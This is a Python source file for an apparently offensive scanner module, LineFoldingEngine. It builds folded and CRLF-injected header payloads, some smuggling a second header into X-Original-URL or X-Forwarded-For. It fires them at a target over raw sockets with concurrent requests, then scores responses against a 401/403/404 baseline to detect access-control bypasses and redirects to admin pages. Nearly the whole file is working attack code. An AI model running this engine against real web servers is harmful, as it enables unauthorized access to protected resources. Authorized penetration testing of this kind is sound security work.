import asyncio
import logging
import ssl
import hashlib
import re
from typing import List, Dict, Optional, Any, Mapping, Tuple
from urllib.parse import urlparse, urlunparse

logger = logging.getLogger(__name__)

class LineFoldingEngine:
    def __init__(self, *, max_payloads: int = 160, max_concurrency: int = 10):
        self.max_payloads = max_payloads
        self.max_concurrency = max_concurrency

        self.user_agents: List[str] = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 "
            "(KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        ]

        self.target_headers = [
            "X-Original-URL",
            "X-Rewrite-URL",
            "X-Forwarded-For",
            "X-Real-IP",
            "X-Forwarded-Host",
            "Referer",
            "User-Agent",
        ]

        self._crlf_tokens = ["\r\n ", "\r\n\t", "\n ", "\n\t"]
        self._lws_tokens = ["  ", "\t", " \t ", "\t \t"]
        self._unicode_tokens = [
            "\u2028",  
            "\u2029", 
            "\u0085",  
            "\u00A0",  
            "\u2002", 
            "\u2003", 
        ]

    async def generate_payloads(self, target_url: str, base_headers: Optional[Dict[str, str]] = None, http_client: Any = None, ) -> List[Dict[str, str]]:
        parsed = urlparse(target_url)
        path = parsed.path or "/"
        base_headers = dict(base_headers or {})
        if "User-Agent" not in base_headers:
            base_headers["User-Agent"] = self.user_agents[0]
        if "Accept" not in base_headers:
            base_headers["Accept"] = "*/*"

        payloads: List[Dict[str, str]] = []
        add = payloads.append

        for token in self._crlf_tokens:
            add({"X-Original-URL": f"{token}{path}"})
            add({"X-Forwarded-For": f"127.0.0.1{token}"})

        for token in self._lws_tokens:
            add({"X-Original-URL": f"{token}{path}"})
            add({"X-Forwarded-For": f"127.0.0.1{token}"})

        for token in ("%0d%0a%20", "%0a%20", "%0d%20", "%0d%0a%09", "%0a%09", "%0d%09"):
            add({"X-Original-URL": f"{token}{path}"})
            add({"X-Forwarded-For": f"127.0.0.1{token}"})

        for token in self._unicode_tokens:
            add({"X-Original-URL": f"{token}{path}"})
            add({"X-Forwarded-For": f"127.0.0.1{token}"})

        add({"X-Forwarded-For": "127.0.0.1\r\n X-Original-URL: /"})
        add({"X-Original-URL": "\r\n X-Forwarded-For: 127.0.0.1"})
        add({"X-Forwarded-For": "127.0.0.1\r\n\t127.0.0.1"})
        add({"Referer": f"/protected\r\n\t{path}"})

        uniq: List[Dict[str, str]] = []
        seen = set()
        for d in payloads:
            key = tuple(sorted(d.items()))
            if key not in seen:
                seen.add(key)
                uniq.append(d)

        if len(uniq) > self.max_payloads:
            uniq = self._stable_cap_dicts(uniq, self.max_payloads)

        logger.info(f"[LineFolding] Generated {len(uniq)} folded-header payloads (cap={self.max_payloads})")
        return uniq

    async def test_payloads(self, target_url: str, payloads: List[Dict[str, str]], http_client: Any = None, ) -> List[Dict[str, Any]]:
        parsed = urlparse(target_url)
        path_q = (parsed.path or "/") + (("?" + parsed.query) if parsed.query else "")
        results: List[Dict[str, Any]] = []
        baseline = await self._raw_request_snapshot(parsed, path_q, headers={"User-Agent": self.user_agents[0]})

        sem = asyncio.Semaphore(self.max_concurrency)

        async def run_one(hdrs: Dict[str, str]) -> Optional[Dict[str, Any]]:
            merged = {
                "User-Agent": self.user_agents[1],
                "Accept": "*/*",
                "Connection": "close",
            }
            merged.update(hdrs)
            try:
                async with sem:
                    snap = await self._raw_request_snapshot(parsed, path_q, headers=merged)
                if not snap or not baseline:
                    return None

                if self._is_valid_bypass(snap, baseline):
                    return {
                        "technique": "line_folding",
                        "headers": hdrs,  
                        "status_code": snap["status"],
                        "response_size": len(snap["body"]),
                        "proof": {
                            "cookie_fp": snap["cookie_fp"],
                            "body_len": len(snap["body"]),
                            "body_md5": snap["body_md5"],
                            "headers_sample": dict(list(snap["headers"].items())[:8]),
                            "location": snap["headers"].get("location", ""),
                        },
                    }

                if 300 <= snap["status"] < 400:
                    loc = snap["headers"].get("location", "")
                    if any(k in (loc or "").lower() for k in ("admin", "dashboard", "console", "manage")):
                        return {
                            "technique": "line_folding_redirect",
                            "headers": hdrs,
                            "status_code": snap["status"],
                            "redirect_location": loc,
                        }

            except Exception as e:
                logger.debug(f"[LineFolding] Request failed: {e}")
            return None

        tasks = [asyncio.create_task(run_one(h)) for h in payloads]
        for out in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(out, Exception):
                logger.debug(f"[LineFolding] Task error: {out}")
                continue
            if out:
                results.append(out)

        return results

    async def _raw_request_snapshot( self, parsed, path: str, headers: Optional[Dict[str, str]] = None, timeout: int = 12 ) -> Optional[Dict[str, Any]]:
        host = parsed.hostname or ""
        port = parsed.port or (443 if parsed.scheme == "https" else 80)

        try:
            if parsed.scheme == "https":
                ctx = ssl.create_default_context()
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port, ssl=ctx, server_hostname=host),
                    timeout=timeout,
                )
            else:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(host=host, port=port), timeout=timeout
                )

            hdrs = headers or {}
            lines = [f"GET {path or '/'} HTTP/1.1", f"Host: {host}"]
            for k, v in hdrs.items():
                if k.lower() == "host":
                    continue
                lines.append(f"{k}: {v}")
            lines.append("") 
            raw = ("\r\n".join(lines) + "\r\n").encode("latin-1", errors="ignore")

            writer.write(raw)
            await writer.drain()

            raw_headers = await self._read_until(reader, b"\r\n\r\n", timeout)
            if raw_headers is None:
                writer.close()
                try:
                    await writer.wait_closed()
                except Exception:
                    pass
                return None

            status, headers_map = self._parse_headers(raw_headers.decode("latin-1", errors="ignore"))
            body = await self._read_body(reader, headers_map, timeout)

            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass

            h_lower = {k.lower(): v for k, v in headers_map.items()}
            body_s = body
            return {
                "status": status,
                "headers": h_lower,
                "body": body_s,
                "body_md5": hashlib.md5(body_s.encode("utf-8", errors="ignore")).hexdigest(),
                "cookie_fp": self._cookie_fingerprint(h_lower.get("set-cookie", "")),
            }

        except Exception as e:
            logger.debug(f"[LineFolding] Raw request error: {e}")
            return None

    async def _read_until(self, reader: asyncio.StreamReader, sep: bytes, timeout: int) -> Optional[bytes]:
        try:
            buf = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                buf += chunk
                i = buf.find(sep)
                if i >= 0:
                    return buf[: i + len(sep)]
                if len(buf) > 256 * 1024: 
                    return None
            return None
        except Exception:
            return None

    def _parse_headers(self, header_blob: str) -> Tuple[int, Dict[str, str]]:
        lines = header_blob.split("\r\n")
        status_line = lines[0] if lines else "HTTP/1.1 000"
        m = re.search(r"\s(\d{3})\s?", status_line)
        code = int(m.group(1)) if m else 0
        headers: Dict[str, str] = {}
        for line in lines[1:]:
            if not line:
                continue
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip()] = v.lstrip()
        return code, headers

    async def _read_body(self, reader: asyncio.StreamReader, headers: Dict[str, str], timeout: int) -> str:
        try:
            if headers.get("Transfer-Encoding", "").lower().startswith("chunked"):
                return await self._read_chunked(reader, timeout)

            length = headers.get("Content-Length")
            if length and length.isdigit():
                n = min(int(length), 512 * 1024)  
                data = await asyncio.wait_for(reader.readexactly(n), timeout=timeout)
                return data.decode(self._guess_encoding(headers), errors="ignore")

            data = b""
            while True:
                chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
                if not chunk:
                    break
                data += chunk
                if len(data) > 512 * 1024:
                    break
            return data.decode(self._guess_encoding(headers), errors="ignore")
        except Exception:
            return ""

    async def _read_chunked(self, reader: asyncio.StreamReader, timeout: int) -> str:
        data = b""
        try:
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=timeout)
                if not line:
                    break
                line = line.strip()
                m = re.match(rb"^([0-9A-Fa-f]+)", line)
                if not m:
                    break
                size = int(m.group(1), 16)
                if size == 0:
                    await asyncio.wait_for(reader.readline(), timeout=timeout)
                    break
                chunk = await asyncio.wait_for(reader.readexactly(size), timeout=timeout)
                data += chunk
                await asyncio.wait_for(reader.readline(), timeout=timeout)
            return data.decode("utf-8", errors="ignore")
        except Exception:
            return data.decode("utf-8", errors="ignore")

    def _guess_encoding(self, headers: Dict[str, str]) -> str:
        ct = headers.get("Content-Type", "")
        m = re.search(r"charset=([A-Za-z0-9_\-]+)", ct, re.I)
        if m:
            return m.group(1)
        return "utf-8"

    def _is_valid_bypass(self, snap: Dict[str, Any], baseline: Dict[str, Any]) -> bool:
        status = snap["status"]
        body = snap["body"] if isinstance(snap["body"], str) else ""
        lbody = body.lower()

        if not (200 <= status < 300):
            return False

        block_indicators = ["access denied", "forbidden", "unauthorized", "blocked", "not authorized", "captcha"]
        if any(b in lbody for b in block_indicators):
            return False

        b_status = baseline["status"]
        b_body = baseline["body"]

        if b_status in (401, 403, 404):
            if snap["cookie_fp"] != baseline["cookie_fp"]:
                return True
            if snap["body_md5"] != baseline["body_md5"]:
                return True
            if abs(len(b_body) - len(body)) > max(64, int(0.15 * max(len(b_body), len(body)))):
                return True
            return False

        same_len_ratio = min(len(b_body), len(body)) / max(1, max(len(b_body), len(body)))
        if same_len_ratio > 0.95 and snap["body_md5"] == baseline["body_md5"]:
            return False

        if snap["cookie_fp"] != baseline["cookie_fp"]:
            return True
        if abs(len(b_body) - len(body)) > max(64, int(0.10 * max(len(b_body), len(body)))):
            return True

        return False

    def _stable_cap_dicts(self, dicts: List[Dict[str, str]], k: int) -> List[Dict[str, str]]:
        scored = []
        for d in dicts:
            key = ";".join(f"{k}={v}" for k, v in sorted(d.items()))
            scored.append((hashlib.sha1(key.encode("utf-8")).hexdigest(), d))
        scored.sort(key=lambda x: x[0])
        return [d for _, d in scored[:k]]

    def _cookie_fingerprint(self, set_cookie_val: str) -> str:
        sc = set_cookie_val or ""
        if not sc:
            return "none"
        parts = [p.strip() for p in re.split(r",(?=[^ ;]+=)", sc)]
        names = []
        for p in parts:
            name = p.split("=", 1)[0].strip().lower()
            attrs = set()
            for a in ("httponly", "secure", "samesite", "path", "domain", "max-age"):
                if re.search(rf"\b{a}\b", p, re.I):
                    attrs.add(a)
            names.append(f"{name};{'|'.join(sorted(attrs))}")
        names.sort()
        return hashlib.sha1(";".join(names).encode("utf-8")).hexdigest()
